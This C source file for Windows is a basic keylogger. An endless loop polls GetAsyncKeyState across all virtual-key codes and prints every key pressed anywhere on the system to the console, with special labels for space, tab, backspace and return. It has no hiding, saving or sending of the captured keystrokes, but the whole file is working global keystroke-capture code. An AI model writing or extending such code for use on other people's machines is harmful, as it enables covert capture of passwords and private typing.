#include <stdio.h>
#include <Windows.h>

typedef enum Bool {false, true} bool;
bool DetermineKey(int key);

int main(){
    while(true){
        for(int i = 0; i < 256; i++){
            if(GetAsyncKeyState(i) & 0x8000){
                if(i >= 'A' && i <= 'z'){
                    printf("%c", i);
                    Sleep(120);
                } else {
                    if(!DetermineKey(i)) fprintf(stderr, "N/A");
                    Sleep(120);
                }
            }
        }
    }
    return 0;
}

bool DetermineKey(int key){
    switch(key){
    case VK_SPACE:
        printf("|SPACE|");
        break;
    case VK_TAB:
        printf("|TAB|");
        break;
    case VK_BACK:
        printf("|BACK|");
        break;
    case VK_RETURN:
        printf("|RETURN|");
        break;
    default: return false;
    }
    return true;
}

